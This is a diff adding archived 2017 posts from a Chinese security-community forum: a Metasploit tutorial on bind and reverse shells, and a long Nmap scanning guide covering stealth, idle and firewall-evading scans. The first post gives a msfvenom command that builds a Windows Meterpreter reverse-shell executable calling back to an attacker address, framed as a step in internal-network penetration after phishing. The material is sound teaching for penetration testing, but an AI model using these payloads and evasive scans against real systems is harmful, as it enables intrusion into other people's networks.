@@ -229,6 +229,50 @@ Metasploitable2下载地址:
 
 ---
 
+<img src="https://file.xiaomiquan.com/57/4c/574c8964905db7d8e404276866e6f4c4ba1bc17edfdea859779872d8c7321078.jpg" width="25px"/> __Flypure@ATToT__ on 2017-07-07:
+
+MSF内网渗透系列-反弹shell
+
+渗透测试时，通过WEB漏洞，拿到了目标网络边缘服务器的webshell，或者通过社工钓鱼，控制了目标办公网络中的一台个人机。
+
+那么结下来就是利用MSF反弹回一个shell，开始在内网扩大我们的战果。
+
+接下来介绍几个基本概念：
+
+payload，又称为攻击载荷。想要返回一个shell，就要在目标机执行我们的payload
+
+正向shell (bind)，需要攻击机主动连接目标端口，如windows/shell/bind_tcp和windows/meterpreter/bind_tcp这两个payload，就会反弹一个正向的shell
+
+反向shell（reverse），目标机会反连接攻击机，如windows/shell/reverse_tcp和windows/meterpreter/reverse_tcp，就会反弹一个反向的shell
+
+meterpreter，Metasploit的一个payload，它具有强大的功能，其具备端口转发和socks代理功能简直就是内网渗透测试神器，windows/meterpreter/reverse_tcp和windows/meterpreter/bind_tcp就会反弹一个meterpreter的shell
+
+在Linux下，那么payload可以选择python/meterpreter/reverse_https
+
+以在window下反弹一个meterpreter的shell为例：
+
+首先利用msfvenom生成我们payload的执行程序：
+
+```
+msfvenom -p windows/meterpreter/reverse_tcp  LHOST=192.168.31.166 LPORT=1234 -f exe > ./test.exe
+```
+
+在目标机192.168.31.196上执行test.exe，使用exploit/multi/handler模块监听，如图，可以看到返回了一个meterpreter的shell
+
+<img src="https://images.xiaomiquan.com/FvpV6xJty5T8eQVL5x3dvE2DOIXU?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:YezmO3MN-DKsGVcqg5bgrhgPzCU=" width="50%" height="50%" align="middle"/>
+
+
+...
+
+
+<img src="https://file.xiaomiquan.com/3c/a6/3ca69f66dd59ce0289025f378c143a4856d1d410551a9df7fcd8ed6b082e6cb3.jpg" width="25px"/> __他好像条狗啊He looks like a dog__: 在目标机上执行？你想执行就执行？
+
+<img src="https://file.xiaomiquan.com/57/4c/574c8964905db7d8e404276866e6f4c4ba1bc17edfdea859779872d8c7321078.jpg" width="25px"/> __Flypure@ATToT__ replies to <img src="https://file.xiaomiquan.com/3c/a6/3ca69f66dd59ce0289025f378c143a4856d1d410551a9df7fcd8ed6b082e6cb3.jpg" width="25px"/> __他好像条狗啊He looks like a dog__: 是的
+
+...
+
+---
+
 
 ## DVWA
 
@@ -420,6 +464,246 @@ Nmap 是玩安全的人必备的工具，无论攻防都必备，基于 Nmap 写
 ...
 
 <img src="https://file.xiaomiquan.com/0a/77/0a779376ed0171ed1b0d4d32b04cfbd349dae7b0bd421f8194ceb0c753f0fcd1.jpg" width="25px"/> __测试测试__: 我来歪楼~~推荐一个书 nmap 6 network exploration and security auditing cookbook😄😄😄
+
+...
+
+---
+
+<img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__ on 2017-07-08:
+
+
+__#工具#__
+
+ 神兵利器之nmap
+好吧，又是一个老套的工具，没有人不知道它，本来我是想开篇一个msf系列的，但是觉得nmap不管在渗透还是网络管理中都是必不可少的工具，必须熟练掌握那种，我敢打赌，密圈里50% 以上的人并不能熟练运用它。
+有的人会说，不就是是扫描器吗？单个IP扫，整个网段扫，个别端口扫，我都会啊，大不了需要的时候再来查参数了。好吧，不过类似书到用时方知少一样，常用的工具熟练掌握是会对工作效率有很大提升的。
+废话不多说，本来我是打算自己详细写写各个参数用法的，发现网上已经有非常详细的教程了，我就在基础上增加一些自己的经验吧。
+
+
+本文由阿德马翻译自国外网站，请尊重劳动成果，转载请注明出处，谢谢
+Nmap是一款网络扫描和主机检测的非常有用的工具。 Nmap是不局限于仅仅收集信息和枚举，同时可以用来作为一个漏洞探测器或安全扫描器。它可以适用于winodws,linux,mac等操作系统。Nmap是一款非常强大的实用工具,可用于：
+
++ 检测活在网络上的主机（主机发现）
++ 检测主机上开放的端口（端口发现或枚举）
++ 检测到相应的端口（服务发现）的软件和版本
++ 检测操作系统，硬件地址，以及软件版本
++ 检测脆弱性的漏洞（Nmap的脚本）
+
+Nmap是一个非常普遍的工具，它有命令行界面和图形用户界面。本人包括以下方面的内容:
+
++ 介绍Nmap
++ 扫描中的重要参数
++ 操作系统检测
++ Nmap使用教程
+
+Nmap使用不同的技术来执行扫描，包括：TCP的connect（）扫描，TCP反向的ident扫描，FTP反弹扫描等。所有这些扫描的类型有自己的优点和缺点，我们接下来将讨论这些问题。
+
+Nmap的使用取决于目标主机,因为有一个简单的（基本）扫描和预先扫描之间的差异。我们需要使用一些先进的技术来绕过防火墙和入侵检测/防御系统，以获得正确的结果。下面是一些基本的命令和它们的用法的例子：
+
+扫描单一的一个主机，命令如下：
+
+```
+nmap nxadmin.com
+nmap 192.168.1.2
+```
+
+扫描整个子网,命令如下:
+
+```
+nmap 192.168.1.1/24
+```
+
+扫描多个目标,命令如下：
+
+```
+nmap 192.168.1.2 192.168.1.5
+```
+
+扫描一个范围内的目标,如下：
+
+```
+nmap 192.168.1.1-100 (扫描IP地址为192.168.1.1-192.168.1.100内的所有主机)
+```
+
+如果你有一个ip地址列表，将这个保存为一个txt文件，和namp在同一目录下,扫描这个txt内的所有主机，命令如下：
+
+```
+nmap -iL ip.txt （该文件里面，一行保存一个ip）
+```
+
+如果你想看到你扫描的所有主机的列表，用以下命令: `nmap -sL 192.168.1.1/24`
+（适用于快速列出该网段的存活主机,我一般这样用 `nmap -sL  192.168.1.1/24 |grep "(*)"`目的是仅列出存活的）
+
+
+扫描除过某一个ip外的所有子网主机,命令：
+
+```
+nmap 192.168.1.1/24 -exclude 192.168.1.1
+```
+
+扫描除过某一个文件中的ip外的子网主机命令
+
+```
+nmap 192.168.1.1/24 -exclude file xxx.txt  (xxx.txt中的文件将会从扫描的主机中排除)
+```
+
+扫描特定主机上的80,21,23端口,命令如下
+
+```
+nmap -p80,21,23 192.168.1.1
+```
+
+在每次命令都加上 -v 或者-vv 参数，会详细显示扫描的过程，不然你就等待一段时间，直接看结果。
+
+从上面我们已经了解了Nmap的基础知识，下面我们深入的探讨一下Nmap的扫描技术.
+
+✊Tcp SYN Scan (sS)
+这是一个基本的扫描方式,它被称为半开放扫描，因为这种技术使得Nmap不需要通过完整的握手，就能获得远程主机的信息。Nmap发送SYN包到远程主机，但是它不会产生任何会话.因此不会在目标主机上产生任何日志记录,因为没有形成会话。这个就是SYN扫描的优势.
+如果Nmap命令中没有指出扫描类型,默认的就是Tcp SYN.但是它需要root/administrator权限.
+(这里我简单讲一下TCP 和SYN的区别，TCP有完整的三次握手过程，就是扫描器发包到探测目标上，然后目标会再返回确认包，然后双方确认后再传送数据，TCP过程繁琐当然扫描效率不高，并且有交互过程所以会在目标上留下日志。而SYN只是TCP三次握手中第一次握手的请求包，扫描过程速度快并且不会在目标上留下日志，我这里只是通俗的讲一下，不了解TCP的，参考这里
+[简析TCP的三次握手与四次分手 | 果冻想](http://www.jellythink.com/archives/705))
+
+
+```
+nmap -sS 192.168.1.1
+```
+
+✊Tcp connect() scan(sT)
+如果不选择SYN扫描,TCP connect()扫描就是默认的扫描模式.不同于Tcp SYN扫描,Tcp connect()扫描需要完成三次握手,并且要求调用系统的connect().Tcp connect()扫描技术只适用于找出TCP和UDP端口.
+
+```
+nmap -sT 192.168.1.1
+```
+
+Udp scan(sU)
+顾名思义,这种扫描技术用来寻找目标主机打开的UDP端口.它不需要发送任何的SYN包，因为这种技术是针对UDP端口的。UDP扫描发送UDP数据包到目标主机，并等待响应,如果返回ICMP不可达的错误消息，说明端口是关闭的，如果得到正确的适当的回应，说明端口是开放的.
+
+```
+nmap -sU 192.168.1.1
+```
+
+✊FIN scan (sF)
+有时候Tcp SYN扫描不是最佳的扫描模式,因为有防火墙的存在.目标主机有时候可能有IDS和IPS系统的存在,防火墙会阻止掉SYN数据包。发送一个设置了FIN标志的数据包并不需要完成TCP的握手.
+
+```
+root@bt:~# nmap -sF 192.168.1.8
+Starting Nmap 5.51  at 2012-07-08 19:21 PKT
+Nmap scan report for 192.168.1.8
+Host is up (0.000026s latency).
+Not shown: 999 closed ports
+PORT STATE SERVICE
+111/tcp open|filtered rpcbind
+```
+
+FIN扫描也不会在目标主机上创建日志(FIN扫描的优势之一).个类型的扫描都是具有差异性的,FIN扫描发送的包只包含FIN标识,NULL扫描不发送数据包上的任何字节,XMAS扫描发送FIN、PSH和URG标识的数据包.（如果你懂tcp协议，就知道FIN是TCP中一个请求断开的标志）
+
+PING Scan (sP)
+PING扫描不同于其它的扫描方式，因为它只用于找出主机是否是存在在网络中的.它不是用来发现是否开放端口的.PING扫描需要ROOT权限，如果用户没有ROOT权限,PING扫描将会使用connect()调用.
+
+```
+nmap -sP 192.168.1.1
+```
+
+✊版本检测(sV)
+版本检测是用来扫描目标主机和端口上运行的软件的版本.它不同于其它的扫描技术，它不是用来扫描目标主机上开放的端口，不过它需要从开放的端口获取信息来判断软件的版本.使用版本检测扫描之前需要先用TCP SYN扫描开放了哪些端口.
+
+```
+nmap -sV 192.168.1.1
+```
+
+Idle scan (sI)（s后面是大写I）
+Idle scan是一种先进的扫描技术，它不是用你真实的主机Ip发送数据包，而是使用另外一个目标网络的主机发送数据包.
+
+```
+nmap -sI 192.168.1.6 192.168.1.1
+```
+
+Idle scan是一种理想的匿名扫描技术,通过目标网络中的192.168.1.6向主机192.168.1.1发送数据，来获取192.168.1.1开放的端口
+（这个idle scan，是不能随便想利用哪个ip做为掩饰的，必须找到idle也就是空闲的主机，这个可以到后面我介绍msf知识的时候，有方法可以探测哪个主机目前是idle状态可以拿来掩盖自己ip）
+另外还有其它的扫描方式，如 FTP bounce（FTP反弹）, fragmentation scan（碎片扫描）, IP protocol scan（IP协议扫描）,以上讨论的是几种最主要的扫描方式.
+
+✊Nmap的OS检测（O）
+Nmap最重要的特点之一是能够远程检测操作系统和软件，Nmap的OS检测技术在渗透测试中用来了解远程主机的操作系统和软件是非常有用的，通过获取的信息你可以知道已知的漏洞。Nmap有一个名为的nmap-OS-DB数据库，该数据库包含超过2600操作系统的信息。 Nmap把TCP和UDP数据包发送到目标机器上，然后检查结果和数据库对照。
+
+```
+Initiating SYN Stealth Scan at 10:21
+Scanning localhost (www.nxadmin.com) [1000 ports]
+Discovered open port 111/tcp on www.nxadmin.com
+Completed SYN Stealth Scan at 10:21, 0.08s elapsed (1000 total ports)
+Initiating OS detection (try #1) against localhost (www.nxadmin.com)
+Retrying OS detection (try #2) against localhost (www.nxadmin.com)
+```
+
+上面的例子清楚地表明，Nmap的首次发现开放的端口，然后发送数据包发现远程操作系统。操作系统检测参数是O（大写O）
+
+Nmap的操作系统指纹识别技术：
+
++ 设备类型（路由器，工作组等）
++ 运行（运行的操作系统）
++ 操作系统的详细信息（操作系统的名称和版本）
++ 网络距离（目标和攻击者之间的距离跳）
+
+如果远程主机有防火墙，IDS和IPS系统，你可以使用-PN命令来确保不ping远程主机，因为有时候防火墙会组织掉ping请求.-PN命令告诉Nmap不用ping远程主机。
+
+```
+nmap -O -PN 192.168.1.1/24
+```
+
+以上命令告诉发信主机远程主机是存活在网络上的，所以没有必要发送ping请求,使用-PN参数可以绕过PING命令,但是不影响主机的系统的发现.
+Nmap的操作系统检测的基础是有开放和关闭的端口，如果OS scan无法检测到至少一个开放或者关闭的端口，会返回以下错误： `Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port`
+
+
+
+```
+nmap -A 192.168.1.1
+```
+
+这个-A 是直接包含了很多功能，免去了敲多个参数的操作，所探测的信息，留给你去动手试一下吧。
+
+在msf里面是可以调用nmap的，输入db_nmap 直接调用，扫描结果保存到msf数据库中。
+一下子就长篇大论了，大多数人肯定都不会看完，这种必会的工具，还是建议每个参数都去敲着看看效果吧！
+另外附上 新手小伙伴容易上手的视频: 
+
+[https://www.ichunqiu.com/course/1219](https://www.ichunqiu.com/course/1219)
+
+
+当然还有更全面从入门到精通的资料: 
+
+[Nmap中文手册 - Nmap中文网](http://www.nmap.com.cn/doc/manual.shtm)
+
+里面包含所有参数的详细讲解，其中的躲避IDS侦测值得好好掌握。
+我准备上msf系列了，大家有什么建议？
+
+<img src="https://images.xiaomiquan.com/Fv6VwvjGa2LBcpydgnPVhnptTSzW?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:d4r-ehPgr0QLD4txOIj51m9Jpcc=" width="50%" height="50%" align="middle"/>
+
+
+...
+
+<img src="https://file.xiaomiquan.com/48/eb/48eb0904e0d74da054d18a11105fe81d59c5a36c2056be97fe9cdd6b532af72a.jpg" width="25px"/> __战狼__: 最好讲下nmap躲避ids.另外非常期待您的msf
+
+<img src="https://file.xiaomiquan.com/16/aa/16aa532fb15c30918c1e256fe0663e4434962db15a1cfc459835d2a556a0cbb5.jpg" width="25px"/> __howl__ replies to <img src="https://file.xiaomiquan.com/48/eb/48eb0904e0d74da054d18a11105fe81d59c5a36c2056be97fe9cdd6b532af72a.jpg" width="25px"/> __战狼__: 自己可以看文档啊，
+[Nmap中文手册 - Nmap中文网](http://www.nmap.com.cn/doc/manual.shtm)
+
+<img src="https://file.xiaomiquan.com/cf/7f/cf7f43f7239631b851f38b8930349bafd8287ac9930c0996b2316197f5245971.jpg" width="25px"/> __breadjun__: nmap带脚本扫描感觉不怎么好用，命中率一般而且慢。
+
+<img src="https://file.xiaomiquan.com/5e/db/5edbb1e6c8a2f0245c9c7016e707c8d2103e4faff3c2c3130f5f724a991466f7.jpg" width="25px"/> __Bingo__: 
+
+```
+--max-rtt-timeout 2000ms  连接超时为2000毫秒
+--max-retries 3 丢包重试最多3次
+--max-scan-delay 2s 发包间隔时间最多2秒
+--host-timeout 30m 每台主机最多扫描30分钟
+```
+
+<img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__ replies to <img src="https://file.xiaomiquan.com/5e/db/5edbb1e6c8a2f0245c9c7016e707c8d2103e4faff3c2c3130f5f724a991466f7.jpg" width="25px"/> __Bingo__: 👍
+
+<img src="https://file.xiaomiquan.com/63/23/6323b002b81350d9211b63938bcf48eb5e088b76145174eb17a3dafb1ba7bbf0.jpg" width="25px"/> __Stone__: 最好讲下nmap躲避防火墙，谢谢
+
+<img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__ replies to <img src="https://file.xiaomiquan.com/63/23/6323b002b81350d9211b63938bcf48eb5e088b76145174eb17a3dafb1ba7bbf0.jpg" width="25px"/> __Stone__: 防火墙不是躲避，而是突破.如果常规的syn半连接扫描被防火墙阻止，可以尝试用其它方式去扫描，比如 (-PA )，这是用Ack方式，又或者(-sF),Fin方式扫描，nmap很强大可以定制各种数据包格式去扫描，如果是绕过IDS入侵防御检测，有很多方式，如果你看过我贴的两个网址的东西，你是有答案的。
+
+<img src="https://file.xiaomiquan.com/e0/1d/e01d033928215404410d8a95fcd0868cc1cde3f31609eb54f6048cc674ef5baa.jpg" width="25px"/> __一休__: 谢谢分享，无聊的周末看看老司机们的分享，又燃起了斗志，自从加了小密圈，忘了我是单身狗😜。关于msf，看到flipper也有系列，觉得是不是需要沟通一下，免得重复了，另外希望有实战的分享😁
+
+<img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__ replies to <img src="https://file.xiaomiquan.com/e0/1d/e01d033928215404410d8a95fcd0868cc1cde3f31609eb54f6048cc674ef5baa.jpg" width="25px"/> __一休__: 嗯，谢谢提醒，我们会商量下。
 
 ...
 
